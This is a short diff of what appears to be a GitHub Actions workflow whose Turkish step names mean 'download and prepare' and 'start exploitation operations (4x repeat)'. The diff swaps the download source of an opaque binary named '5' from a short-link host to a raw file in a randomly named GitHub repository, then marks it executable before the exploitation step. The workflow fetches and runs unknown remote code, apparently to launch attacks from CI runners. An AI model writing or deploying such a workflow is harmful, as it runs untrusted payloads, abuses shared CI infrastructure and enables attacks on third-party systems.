@@ -24,7 +24,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/OtjoHPcdVJ/5 -O 5
+          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
           chmod +x 5
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
